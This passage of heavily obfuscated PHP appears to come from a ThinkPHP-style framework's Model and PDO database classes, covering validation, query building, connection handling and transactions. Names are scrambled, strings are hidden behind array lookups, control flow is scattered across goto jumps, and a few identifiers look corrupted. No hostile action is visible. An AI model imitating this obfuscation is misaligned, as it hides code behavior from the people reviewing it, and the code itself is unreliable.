trim($bÉ¬ÇÉ¸³¶[$e«Ã­˜Îƒ[0]])) { if (!1 === $this->_validationField($bÉ¬ÇÉ¸³¶, $e«Ã­˜Îƒ)) { return !1; } } break; default: if (isset($bÉ¬ÇÉ¸³¶[$e«Ã­˜Îƒ[0]])) { if (!1 === $this->_validationField($bÉ¬ÇÉ¸³¶, $e«Ã­˜Îƒ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($b¯²¿¡Ç£, $bŠ”ØÂ†‰½) { if (!1 === $this->_validationFieldItem($b¯²¿¡Ç£, $bŠ”ØÂ†‰½)) { if ($this->patchValidate) { $this->error[$bŠ”ØÂ†‰½[0]] = $bŠ”ØÂ†‰½[2]; } else { $this->error = $bŠ”ØÂ†‰½[2]; return !1; } } return; } protected function _validationFieldItem($A§øœÑÒ¥, $có„‚Â×Ø“) { $DÛ°á³Ÿê =& $_SERVER[åÌÛ»ô¢‚ö™]; switch (strtolower(trim($có„‚Â×Ø“[4]))) { case $DÛ°á³Ÿê[324]: case $DÛ°á³Ÿê[325]: $f—¦âÏ“· = isset($có„‚Â×Ø“[6]) ? (array) $có„‚Â×Ø“[6] : array(); if (is_string($có„‚Â×Ø“[0]) && strpos($có„‚Â×Ø“[0], $DÛ°á³Ÿê[47])) { $có„‚Â×Ø“[0] = explode($DÛ°á³Ÿê[47], $có„‚Â×Ø“[0]); } if (is_array($có„‚Â×Ø“[0])) { foreach ($có„‚Â×Ø“[0] as $cåÈ‘›„Ì) { $eªÌŸÔÛÆß[$cåÈ‘›„Ì] = $A§øœÑÒ¥[$cåÈ‘›„Ì]; } array_unshift($f—¦âÏ“·, $eªÌŸÔÛÆß); } else { array_unshift($f—¦âÏ“·, $A§øœÑÒ¥[$có„‚Â×Ø“[0]]); } if ($DÛ°á³Ÿê[324] == $có„‚Â×Ø“[4]) { return call_user_func_array($có„‚Â×Ø“[1], $f—¦âÏ“·); } else { return call_user_func_array(array(&$this, $có„‚Â×Ø“[1]), $f—¦âÏ“·); } case $DÛ°á³Ÿê[332]: return $A§øœÑÒ¥[$có„‚Â×Ø“[0]] == $A§øœÑÒ¥[$có„‚Â×Ø“[1]]; case $DÛ°á³Ÿê[333]: if (is_string($có„‚Â×Ø“[0]) && strpos($có„‚Â×Ø“[0], $DÛ°á³Ÿê[47])) { $có„‚Â×Ø“[0] = explode($DÛ°á³Ÿê[47], $có„‚Â×Ø“[0]); } $bø™´âÈˆ… = array(); if (is_array($có„‚Â×Ø“[0])) { foreach ($có„‚Â×Ø“[0] as $cåÈ‘›„Ì) { $bø™´âÈˆ…[$cåÈ‘›„Ì] = $A§øœÑÒ¥[$cåÈ‘›„Ì]; } } else { $bø™´âÈˆ…[$có„‚Â×Ø“[0]] = $A§øœÑÒ¥[$có„‚Â×Ø“[0]]; } if (!empty($A§øœÑÒ¥[$this->getPk()])) { $bø™´âÈˆ…[$this->getPk()] = array($DÛ°á³Ÿê[334], $A§øœÑÒ¥[$this->getPk()]); } if ($this->where($bø™´âÈˆ…)->find()) { return !1; } return !0; default: return $this->check($A§øœÑÒ¥[$có„‚Â×Ø“[0]], $có„‚Â×Ø“[1], $có„‚Â×Ø“[4]); } } public function check($BÆÚß±¨Š, $aÂß­È¹‘¼, $f’¨š†áğ× = "\x72\x65\147\x65\170") { $FÖß¢¸¿¡· =& $_SERVER[åÌÛ»ô¢‚ö™]; $f’¨š†áğ× = strtolower(trim($f’¨š†áğ×)); switch ($f’¨š†áğ×) { case $FÖß¢¸¿¡·[7]: case $FÖß¢¸¿¡·[335]: $e²è¸½ôÙÉ = is_array($aÂß­È¹‘¼) ? $aÂß­È¹‘¼ : explode($FÖß¢¸¿¡·[47], $aÂß­È¹‘¼); return $f’¨š†áğ× == $FÖß¢¸¿¡·[7] ? in_array($BÆÚß±¨Š, $e²è¸½ôÙÉ) : !in_array($BÆÚß±¨Š, $e²è¸½ôÙÉ); case $FÖß¢¸¿¡·[336]: case $FÖß¢¸¿¡·[337]: if (is_array($aÂß­È¹‘¼)) { $c¡”œ£÷©Œ = $aÂß­È¹‘¼[0]; $EïĞ‰§‚‚Ê = $aÂß­È¹‘¼[1]; } else { list($c¡”œ£÷©Œ, $EïĞ‰§‚‚Ê) = explode($FÖß¢¸¿¡·[47], $aÂß­È¹‘¼); } return $f’¨š†áğ× == $FÖß¢¸¿¡·[336] ? $BÆÚß±¨Š >= $c¡”œ£÷©Œ && $BÆÚß±¨Š <= $EïĞ‰§‚‚Ê : $BÆÚß±¨Š < $c¡”œ£÷©Œ || $BÆÚß±¨Š > $EïĞ‰§‚‚Ê; case $FÖß¢¸¿¡·[338]: case $FÖß¢¸¿¡·[339]: return $f’¨š†áğ× == $FÖß¢¸¿¡·[338] ? $BÆÚß±¨Š == $aÂß­È¹‘¼ : $BÆÚß±¨Š != $aÂß­È¹‘¼; case $FÖß¢¸¿¡·[340]: $fÌÛ¶ÂÛ“ = mb_strlen($BÆÚß±¨Š, $FÖß¢¸¿¡·[341]); if (strpos($aÂß­È¹‘¼, $FÖß¢¸¿¡·[47])) { list($c¡”œ£÷©Œ, $EïĞ‰§‚‚Ê) = explode($FÖß¢¸¿¡·[47], $aÂß­È¹‘¼); return $fÌÛ¶ÂÛ“ >= $c¡”œ£÷©Œ && $fÌÛ¶ÂÛ“ <= $EïĞ‰§‚‚Ê; } else { return $fÌÛ¶ÂÛ“ == $aÂß­È¹‘¼; } case $FÖß¢¸¿¡·[342]: list($A¶³­¬Â¿, $B×«¢×®Ÿõ) = explode($FÖß¢¸¿¡·[47], $aÂß­È¹‘¼); if (!is_numeric($A¶³­¬Â¿)) { $A¶³­¬Â¿ = strtotime($A¶³­¬Â¿); } if (!is_numeric($B×«¢×®Ÿõ)) { $B×«¢×®Ÿõ = strtotime($B×«¢×®Ÿõ); } return NOW_TIME >= $A¶³­¬Â¿ && NOW_TIME <= $B×«¢×®Ÿõ; case $FÖß¢¸¿¡·[343]: return in_array(get_client_ip(), explode($FÖß¢¸¿¡·[47], $aÂß­È¹‘¼)); case $FÖß¢¸¿¡·[344]: return !in_array(get_client_ip(), explode($FÖß¢¸¿¡·[47], $aÂß­È¹‘¼)); case $FÖß¢¸¿¡·[331]: default: return $this->regex($BÆÚß±¨Š, $aÂß­È¹‘¼); } } public function query($FÆ×…äß‰°, $aÍ¤®‡³á = false) { $cß×ô¼ƒæ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!is_bool($aÍ¤®‡³á) && !is_array($aÍ¤®‡³á)) { $aÍ¤®‡³á = func_get_args(); array_shift($aÍ¤®‡³á); } $FÆ×…äß‰° = str_replace(array($cß×ô¼ƒæ[183], $cß×ô¼ƒæ[345]), $cß×ô¼ƒæ[50], $FÆ×…äß‰°); $FÆ×…äß‰° = $this->parseSql($FÆ×…äß‰°, $aÍ¤®‡³á); return $this->db->query($FÆ×…äß‰°); } public function execute($cˆ¸Ñî ¨, $Eµ’ç¾Ó±ƒ = false) { if (!is_bool($Eµ’ç¾Ó±ƒ) && !is_array($Eµ’ç¾Ó±ƒ)) { $Eµ’ç¾Ó±ƒ = func_get_args(); array_shift($Eµ’ç¾Ó±ƒ); } $cˆ¸Ñî ¨ = $this->parseSql($cˆ¸Ñî ¨, $Eµ’ç¾Ó±ƒ); return $this->db->execute($cˆ¸Ñî ¨); } protected function parseSql($CÛŠÙ‰Ä™‚, $b•ğ¿•) { $eö›Ô ø® =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!0 === $b•ğ¿•) { $EŒ»‡ó‡À¦ = $this->_parseOptions(); $CÛŠÙ‰Ä™‚ = $this->db->parseSql($CÛŠÙ‰Ä™‚, $EŒ»‡ó‡À¦); } elseif (is_array($b•ğ¿•)) { $b•ğ¿• = array_map(array($this->db, $eö›Ô ø®[346]), $b•ğ¿•); $CÛŠÙ‰Ä™‚ = vsprintf($CÛŠÙ‰Ä™‚, $b•ğ¿•); } else { $CÛŠÙ‰Ä™‚ = strtr($CÛŠÙ‰Ä™‚, array($eö›Ô ø®[347] => $this->getTableName(), $eö›Ô ø®[348] => think_config($eö›Ô ø®[247]))); } $this->db->setModel($this->name); return $CÛŠÙ‰Ä™‚; } public function db($b½¾¥¢êÚŠ = '', $e§£Âö¬Òí = '', $C¹Ï§ãÂùé = array()) { goto có³ÊŸ Úß; EÁ„•¾æ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto Aœİƒ·«»›; f—À Û¶•Ê: static $c¨ÛÆÓ¦­© = array(); if (!isset($c¨ÛÆÓ¦­©[$b½¾¥¢êÚŠ]) || isset($c¨ÛÆÓ¦­©[$b½¾¥¢êÚŠ]) && $e§£Âö¬Òí && $D¤é™‡óø[$b½¾¥¢êÚŠ] != $e§£Âö¬Òí) { if (!empty($e§£Âö¬Òí) && is_string($e§£Âö¬Òí) && !1 === strpos($e§£Âö¬Òí, $Eì¬ÙÁ¨º½[8])) { $e§£Âö¬Òí = think_config($e§£Âö¬Òí); } $c¨ÛÆÓ¦­©[$b½¾¥¢êÚŠ] = Db::getInstance($e§£Âö¬Òí); } elseif (NULL === $e§£Âö¬Òí) { $c¨ÛÆÓ¦­©[$b½¾¥¢êÚŠ]->close(); unset($c¨ÛÆÓ¦­©[$b½¾¥¢êÚŠ]); return; } if (!empty($C¹Ï§ãÂùé)) { if (is_string($C¹Ï§ãÂùé)) { parse_str($C¹Ï§ãÂùé, $C¹Ï§ãÂùé); } foreach ($C¹Ï§ãÂùé as $b” õ¾¾ => $F÷«¬¯ĞÃÍ) { $this->setProperty($b” õ¾¾, $F÷«¬¯ĞÃÍ); } } goto AöÊŒ­ŸÄğ; AöÊŒ­ŸÄğ: $D¤é™‡óø[$b½¾¥¢êÚŠ] = $e§£Âö¬Òí; $this->db = $c¨ÛÆÓ¦­©[$b½¾¥¢êÚŠ]; $this->_after_db(); goto EÁ„•¾æ; có³ÊŸ Úß: $Eì¬ÙÁ¨º½ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($Eì¬ÙÁ¨º½[33] === $b½¾¥¢êÚŠ && $this->db) { return $this->db; } static $D¤é™‡óø = array(); goto f—À Û¶•Ê; Aœİƒ·«»›: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $aÁÉ»´Ÿç = get_class($this); if ($aÁÉ»´Ÿç == $_SERVER[åÌÛ»ô¢‚ö™][349]) { return $this->name; } $this->name = substr($aÁÉ»´Ÿç, 0, -5); } return $this->name; } public function getTableName() { $eù¡«óÎ¤ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (empty($this->trueTableName)) { $EíÖˆ¬Û = !empty($this->tablePrefix) ? $this->tablePrefix : $eù¡«óÎ¤[33]; if (!empty($this->tableName)) { $EíÖˆ¬Û .= $this->tableName; } else { $EíÖˆ¬Û .= think_parse_name($this->name); } $this->trueTableName = strtolower($EíÖˆ¬Û); } return (!empty($this->dbName) ? $this->dbName . $eù¡«óÎ¤[91] : $eù¡«óÎ¤[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $F“®‚½í®‹ =& $_SERVER[åÌÛ»ô¢‚ö™]; return isset($this->fields[$F“®‚½í®‹[254]]) ? $this->fields[$F“®‚½í®‹[254]] : $this->pk; } public function getDbFields() { $aøê™”ùïã =& $_SERVER[åÌÛ»ô¢‚ö™]; if (isset($this->options[$aøê™”ùïã[282]])) { $E»±°ÛöÙ… = $this->db->getFields($this->options[$aøê™”ùïã[282]]); return $E»±°ÛöÙ… ? array_keys($E»±°ÛöÙ…) : !1; } if ($this->fields) { $E»±°ÛöÙ… = $this->fields; unset($E»±°ÛöÙ…[$aøê™”ùïã[253]], $E»±°ÛöÙ…[$aøê™”ùïã[254]], $E»±°ÛöÙ…[$aøê™”ùïã[255]], $E»±°ÛöÙ…[$aøê™”ùïã[252]]); return $E»±°ÛöÙ…; } return !1; } public function data($dÙ˜õÙŠå = '') { $AÄğ´ÏØ… =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($AÄğ´ÏØ…[33] === $dÙ˜õÙŠå && !empty($this->data)) { return $this->data; } if (is_object($dÙ˜õÙŠå)) { $dÙ˜õÙŠå = get_object_vars($dÙ˜õÙŠå); } elseif (is_string($dÙ˜õÙŠå)) { parse_str($dÙ˜õÙŠå, $dÙ˜õÙŠå); } elseif (!is_array($dÙ˜õÙŠå)) { think_exception(think_lang($AÄğ´ÏØ…[274])); } $this->data = $dÙ˜õÙŠå; return $this; } public function join($Fãöºç…Ñ) { $FÓÁ‡ğåó =& $_SERVER[åÌÛ»ô¢‚ö™]; if (is_array($Fãöºç…Ñ)) { $this->options[$FÓÁ‡ğåó[285]] = $Fãöºç…Ñ; } elseif (!empty($Fãöºç…Ñ)) { $this->options[$FÓÁ‡ğåó[285]][] = $Fãöºç…Ñ; } return $this; } public function union($eƒ’¯Ãˆ’Œ, $b‘¸‰ƒ™Ù = false) { goto b÷ÆÀœåô×; bƒ—„Šãñö: return $this; goto AøîÍÅÍù; b÷ÆÀœåô×: $E§Ù†ŸËÂø =& $_SERVER[åÌÛ»ô¢‚ö™]; if (empty($eƒ’¯Ãˆ’Œ)) { return $this; } if ($b‘¸‰ƒ™Ù) { $this->options[$E§Ù†ŸËÂø[350]][$E§Ù†ŸËÂø[351]] = !0; } goto cï¿‚’Šµ; cï¿‚’Šµ: if (is_object($eƒ’¯Ãˆ’Œ)) { $eƒ’¯Ãˆ’Œ = get_object_vars($eƒ’¯Ãˆ’Œ); } if (is_string($eƒ’¯Ãˆ’Œ)) { $AŒå¾Ïïº = $eƒ’¯Ãˆ’Œ; } elseif (is_array($eƒ’¯Ãˆ’Œ)) { if (isset($eƒ’¯Ãˆ’Œ[0])) { $this->options[$E§Ù†ŸËÂø[350]] = array_merge($this->options[$E§Ù†ŸËÂø[350]], $eƒ’¯Ãˆ’Œ); return $this; } else { $AŒå¾Ïïº = $eƒ’¯Ãˆ’Œ; } } else { think_exception(think_lang($E§Ù†ŸËÂø[274])); } $this->options[$E§Ù†ŸËÂø[350]][] = $AŒå¾Ïïº; goto bƒ—„Šãñö; AøîÍÅÍù: } public function cache($Cá‘Ûß‡½ = true, $AŸ‰ó˜â“… = null, $f‰ø¦ìØ¸ = '') { $b»¿±·ï“— =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!1 !== $Cá‘Ûß‡½) { $this->options[$b»¿±·ï“—[352]] = array($b»¿±·ï“—[89] => $Cá‘Ûß‡½, $b»¿±·ï“—[342] => $AŸ‰ó˜â“…, $b»¿±·ï“—[29] => $f‰ø¦ìØ¸); } return $this; } public function field($eØ‰–™¦ß, $DÌºšºß¯Ú = false) { $b‰Ô·»†ç =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!0 === $eØ‰–™¦ß) { $A·ê·¥Ç„× = $this->getDbFields(); $eØ‰–™¦ß = $A·ê·¥Ç„× ? $A·ê·¥Ç„× : $b‰Ô·»†ç[190]; } elseif ($DÌºšºß¯Ú) { if (is_string($eØ‰–™¦ß)) { $eØ‰–™¦ß = explode($b‰Ô·»†ç[47], $eØ‰–™¦ß); } $A·ê·¥Ç„× = $this->getDbFields(); $eØ‰–™¦ß = $A·ê·¥Ç„× ? array_diff($A·ê·¥Ç„×, $eØ‰–™¦ß) : $eØ‰–™¦ß; } $this->options[$b‰Ô·»†ç[276]] = $eØ‰–™¦ß; return $this; } public function scope($D­Œ×ÀòÇÓ = '', $D¡ÒÌ…  = NULL) { $eâÄ¬Ô´¢ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($eâÄ¬Ô´¢[33] === $D­Œ×ÀòÇÓ) { if (isset($this->_scope[$eâÄ¬Ô´¢[34]])) { $FêÌ××ğ– = $this->_scope[$eâÄ¬Ô´¢[34]]; } else { return $this; } } elseif (is_string($D­Œ×ÀòÇÓ)) { $e±‡§§õíã = explode($eâÄ¬Ô´¢[47], $D­Œ×ÀòÇÓ); $FêÌ××ğ– = array(); foreach ($e±‡§§õíã as $eê¢¡ØÜÔª) { if (!isset($this->_scope[$eê¢¡ØÜÔª])) { continue; } $FêÌ××ğ– = array_merge($FêÌ××ğ–, $this->_scope[$eê¢¡ØÜÔª]); } if (!empty($D¡ÒÌ… ) && is_array($D¡ÒÌ… )) { $FêÌ××ğ– = array_merge($FêÌ××ğ–, $D¡ÒÌ… ); } } elseif (is_array($D­Œ×ÀòÇÓ)) { $FêÌ××ğ– = $D­Œ×ÀòÇÓ; } if (is_array($FêÌ××ğ–) && !empty($FêÌ××ğ–)) { $this->options = array_merge($this->options, array_change_key_case($FêÌ××ğ–)); } return $this; } public function where($eÖÔ¸šÁÅ», $eŠÇÔ°ª†‡ = null) { $C‹Œ‘ÜŒÃÉ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!is_null($eŠÇÔ°ª†‡) && is_string($eÖÔ¸šÁÅ»)) { if (!is_array($eŠÇÔ°ª†‡)) { $eŠÇÔ°ª†‡ = func_get_args(); array_shift($eŠÇÔ°ª†‡); } $eŠÇÔ°ª†‡ = array_map(array($this->db, $C‹Œ‘ÜŒÃÉ[346]), $eŠÇÔ°ª†‡); $eÖÔ¸šÁÅ» = vsprintf($eÖÔ¸šÁÅ», $eŠÇÔ°ª†‡); } elseif (is_object($eÖÔ¸šÁÅ»)) { $eÖÔ¸šÁÅ» = get_object_vars($eÖÔ¸šÁÅ»); } elseif (is_array($eÖÔ¸šÁÅ»)) { foreach ($eÖÔ¸šÁÅ» as $aÍ´ƒïöï‘ => $c†åñÎ°é¢) { if ((is_numeric($aÍ´ƒïöï‘) || !$aÍ´ƒïöï‘) && is_string($c†åñÎ°é¢)) { if (strpos($c†åñÎ°é¢, $C‹Œ‘ÜŒÃÉ[353]) === 0) { continue; } think_trace($C‹Œ‘ÜŒÃÉ[354], $C‹Œ‘ÜŒÃÉ[33], $C‹Œ‘ÜŒÃÉ[46]); die; } } } if (is_string($eÖÔ¸šÁÅ») && $C‹Œ‘ÜŒÃÉ[33] != $eÖÔ¸šÁÅ») { $cÍéªá¾ß‹ = array(); $cÍéªá¾ß‹[$C‹Œ‘ÜŒÃÉ[355]] = $eÖÔ¸šÁÅ»; $eÖÔ¸šÁÅ» = $cÍéªá¾ß‹; } if (isset($this->options[$C‹Œ‘ÜŒÃÉ[278]])) { $this->options[$C‹Œ‘ÜŒÃÉ[278]] = array_merge($this->options[$C‹Œ‘ÜŒÃÉ[278]], $eÖÔ¸šÁÅ»); } else { $this->options[$C‹Œ‘ÜŒÃÉ[278]] = $eÖÔ¸šÁÅ»; } return $this; } public function limit($Fèëòé÷É‰, $fºÁÄ³ = null) { $B¥Û¯âà =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->options[$B¥Û¯âà[295]] = is_null($fºÁÄ³) ? $Fèëòé÷É‰ : $Fèëòé÷É‰ . $B¥Û¯âà[47] . $fºÁÄ³; return $this; } public function page($a§¡†çƒ–¾, $Aà±½æ„ö‰ = null) { $B¨ÕÌ¹Ò¨ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->options[$B¨ÕÌ¹Ò¨[356]] = is_null($Aà±½æ„ö‰) ? $a§¡†çƒ–¾ : $a§¡†çƒ–¾ . $B¨ÕÌ¹Ò¨[47] . $Aà±½æ„ö‰; return $this; } public function comment($C¹ÀÇá©Õ) { $this->options[$_SERVER[åÌÛ»ô¢‚ö™][357]] = $C¹ÀÇá©Õ; return $this; } public function setProperty($fí¥ÄÔ×¾, $F¢¡ø©Âåé) { if (property_exists($this, $fí¥ÄÔ×¾)) { $this->{$fí¥ÄÔ×¾} = $F¢¡ø©Âåé; } return $this; } } goto CìÏŞÆ; C‰¹ª¿ä¿Ö: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($C Î’¥†Š = '') { $dæ¯ÕŠ¦‘ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!class_exists($dæ¯ÕŠ¦‘[851])) { think_exception(think_lang($dæ¯ÕŠ¦‘[10]) . $dæ¯ÕŠ¦‘[852]); } if (!empty($C Î’¥†Š)) { $this->config = $C Î’¥†Š; if (empty($this->config[$dæ¯ÕŠ¦‘[13]])) { $this->config[$dæ¯ÕŠ¦‘[13]] = array(); } } } public function connect($AÜ¨ª§œ’Ì = '', $dÜ›—“µéÕ = 0) { $D—Äè… ˆÎ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!isset($this->linkID[$dÜ›—“µéÕ])) { goto E•âÏñ; E•âÏñ: if (empty($AÜ¨ª§œ’Ì)) { $AÜ¨ª§œ’Ì = $this->config; } if ($this->pconnect) { $AÜ¨ª§œ’Ì[$D—Äè… ˆÎ[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$dÜ›—“µéÕ] = new PDO($AÜ¨ª§œ’Ì[$D—Äè… ˆÎ[853]], $AÜ¨ª§œ’Ì[$D—Äè… ˆÎ[826]], $AÜ¨ª§œ’Ì[$D—Äè… ˆÎ[827]], $AÜ¨ª§œ’Ì[$D—Äè… ˆÎ[13]]); } catch (PDOException $C÷íÒ¼î…ğ) { think_exception($C÷íÒ¼î…ğ->getMessage()); } goto b»Ù­ÕˆÑ¾; fÊµìù: try { $this->linkID[$dÜ›—“µéÕ]->exec($D—Äè… ˆÎ[862] . think_config($D—Äè… ˆÎ[829])); } catch (Exception $C÷íÒ¼î…ğ) { } $this->connected = !0; if (1 != think_config($D—Äè… ˆÎ[18])) { unset($this->config); } goto AÜ¶¢‡ÂÇà; b»Ù­ÕˆÑ¾: $this->dbType = $this->_getDsnType($AÜ¨ª§œ’Ì[$D—Äè… ˆÎ[853]]); if (in_array($this->dbType, array($D—Äè… ˆÎ[854], $D—Äè… ˆÎ[855], $D—Äè… ˆÎ[856], $D—Äè… ˆÎ[857]))) { think_exception($D—Äè… ˆÎ[858] . $this->dbType . $D—Äè… ˆÎ[859] . $this->dbType . $D—Äè… ˆÎ[860]); } if (!$this->linkID[$dÜ›—“µéÕ]) { think_exception($D—Äè… ˆÎ[861]); } goto fÊµìù; AÜ¶¢‡ÂÇà: } return $this->linkID[$dÜ›—“µéÕ]; } public function free() { $this->PDOStatement = null; } public function query($F›†â›ùİŠ, $E•Ê½›ğ‚ = array()) { goto fìÜ›²×íŸ; dİèóé¥Ğ: if (!1 === $f”ƒ´™ÇÑ‚) { $this->error(); return !1; } else { return $this->getAll(); } goto A™Ø’Ááë‹; fìÜ›²×íŸ: $b ÀŠ™Ş™á =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto FÓ³ˆš¤ğƒ; FÓ³ˆš¤ğƒ: $this->queryStr = $F›†â›ùİŠ; if (!empty($E•Ê½›ğ‚)) { $this->queryStr .= $b ÀŠ™Ş™á[863] . print_r($E•Ê½›ğ‚, !0) . $b ÀŠ™Ş™á[864]; } if (!empty($this->PDOStatement)) { $this->free(); } goto FÕ¨ôÊ„„²; FÕ¨ôÊ„„²: think_action_status($b ÀŠ™Ş™á[19], 1); think_status($b ÀŠ™Ş™á[20]); $this->PDOStatement = $this->_linkID->prepare($F›†â›ùİŠ); goto eí½Î‡“ÏÎ; eí½Î‡“ÏÎ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $f”ƒ´™ÇÑ‚ = $this->PDOStatement->execute($E•Ê½›ğ‚); $this->debug(); goto dİèóé¥Ğ; A™Ø’Ááë‹: } public function execute($B­Æ¦§åšĞ, $C¨¨—«¡‰ = array()) { goto E„¬ºšĞ; E„¬ºšĞ: $D¯Äš¬Øõ  =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto fÅ¨¶óŸƒ; Dàó‰¥ŠØ: if ($this->dbType == $D¯Äš¬Øõ [857]) { if (preg_match($D¯Äš¬Øõ [865], $this->queryStr, $Eìˆ´‚Š)) { $this->table = think_config($D¯Äš¬Øõ [866]) . str_ireplace(think_config($D¯Äš¬Øõ [867]), $D¯Äš¬Øõ [377], $Eìˆ´‚Š[2]); $b‚«œáíœÇ = (bool) $this->query($D¯Äš¬Øõ [868] . strtoupper($this->table) . $D¯Äš¬Øõ [55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($D¯Äš¬Øõ [21], 1); goto Dã” èî¨; Dã” èî¨: think_status($D¯Äš¬Øõ [20]); $this->PDOStatement = $this->_linkID->prepare($B­Æ¦§åšĞ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto Bõñ‡ó´¬÷; fÅ¨¶óŸƒ: $this->queryStr = $B­Æ¦§åšĞ; if (!empty($C¨¨—«¡‰)) { $this->queryStr .= $D¯Äš¬Øõ [863] . print_r($C¨¨—«¡‰, !0) . $D¯Äš¬Øõ [864]; } $b‚«œáíœÇ = !1; goto Dàó‰¥ŠØ; Bõñ‡ó´¬÷: $AïÀ³‡ë‰£ = $this->PDOStatement->execute($C¨¨—«¡‰); $this->debug(); if (!1 === $AïÀ³‡ë‰£) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($b‚«œáíœÇ || preg_match($D¯Äš¬Øõ [869], $B­Æ¦§åšĞ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto f…Å‚„Úì¼; f…Å‚„Úì¼: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Fšõ¿Ãâß‚ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Fšõ¿Ãâß‚) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $A•­ŒÆŠÇé = $this->_linkID->rollback(); $this->transTimes = 0; if (!$A•­ŒÆŠÇé) { $this->error(); return !1; } } return !0; } private function getAll() { $eÏÛÈ”Æ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($eÏÛÈ”Æ); return $eÏÛÈ”Æ; } public function getFields($bÙÃ¿É…ŠÃ) { goto BØØŸÅ£ò; Bì³–ŠÃˆë: return $EŒâÜÏ§É´; goto FÀÁ¶Õë››; BØØŸÅ£ò: $eî¹‡ëà°ö =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->initConnect(!0); if (think_config($eî¹‡ëà°ö[870])) { $cÆËùÔæ· = str_replace($eî¹‡ëà°ö[871], $bÙÃ¿É…ŠÃ, think_config($eî¹‡ëà°ö[870])); } else { switch ($this->dbType) { case $eî¹‡ëà°ö[854]: case $eî¹‡ëà°ö[872]: $cÆËùÔæ· = "\x53\x45\x4c\x45\x43\x54\40\40\x20\x63\157\x6c\x75\155\156\137\x6e\141\155\145\40\141\x73\x20\47\x4e\141\x6d\x65\47\x2c\40\40\x20\x64\x61\x74\x61\137\x74\171\160\145\x20\141\163\40\47\124\x79\x70\145\x27\54\40\x20\x20\x63\x6f\x6c\165\155\x6e\x5f\144\145\x66\141\165\x6c\x74\40\141\x73\40\47\x44\145\x66\141\165\154\x74\47\54\40\x20\x20\x69\x73\137\156\165\154\x6c\x61\x62\154\x65\x20\x61\x73\x20\x27\x4e\x75\154\x6c\x27\xa\11\11\x46\122\x4f\x4d\11\151\x6e\x66\x6f\x72\155\x61\164\151\157\156\137\x73\x63\150\x65\x6d\x61\56\164\x61\142\154\x65\x73\40\x41\x53\40\x74\12\x9\x9\x4a\x4f\x49\x4e\x9\151\x6e\146\x6f\x72\x6d\x61\x74\151\x6f\156\x5f\x73\143\x68\x65\155\141\x2e\143\157\154\165\155\156\x73\x20\x41\x53\40\143\12\11\x9\117\116\40\40\164\56\164\x61\x62\154\x65\137\x63\x61\164\x61\154\157\x67\x20\x3d\40\x63\x2e\x74\x61\142\154\145\137\143\x61\x74\x61\x6c\x6f\147\xa\11\11\x41\116\x44\40\164\56\x74\x61\x62\154\x65\137\x73\x63\x68\x65\155\141\x20\75\x20\x63\x2e\164\141\x62\x6c\x65\137\163\143\150\145\155\x61\12\11\x9\x41\116\x44\x20\164\x2e\x74\x61\142\x6c\145\x5f\x6e\141\x6d\x65\x20\75\x20\x63\56\x74\x61\x62\154\145\x5f\x6e\x61\155\145\12\11\x9\127\x48\105\122\x45\40\x20\40\164\56\164\x61\x62\x6c\145\x5f\156\x61\155\x65\40\x3d\x20\47{$bÙÃ¿É…ŠÃ}\47"; break; case $eî¹‡ëà°ö[873]: $cÆËùÔæ· = $eî¹‡ëà°ö[874] . $bÙÃ¿É…ŠÃ . $eî¹‡ëà°ö[875]; break; case $eî¹‡ëà°ö[855]: case $eî¹‡ëà°ö[857]: $cÆËùÔæ· = $eî¹‡ëà°ö[876] . $eî¹‡ëà°ö[877] . $eî¹‡ëà°ö[878] . strtoupper($bÙÃ¿É…ŠÃ) . $eî¹‡ëà°ö[879] . strtoupper($bÙÃ¿É…ŠÃ) . $eî¹‡ëà°ö[880]; break; case $eî¹‡ëà°ö[881]: $cÆËùÔæ· = $eî¹‡ëà°ö[882] . $bÙÃ¿É…ŠÃ . $eî¹‡ëà°ö[883]; break; case $eî¹‡ëà°ö[856]: break; case $eî¹‡ëà°ö[884]: default: $cÆËùÔæ· = $eî¹‡ëà°ö[885] . ($this->dbType == $eî¹‡ëà°ö[884] ? "\x60{$bÙÃ¿É…ŠÃ}\140" : $bÙÃ¿É…ŠÃ); } } goto cÍƒæ‰¡Â†; cÍƒæ‰¡Â†: $cŸô‚¢à = $this->query($cÆËùÔæ·); $EŒâÜÏ§É´ = array(); if ($cŸô‚¢à) { foreach 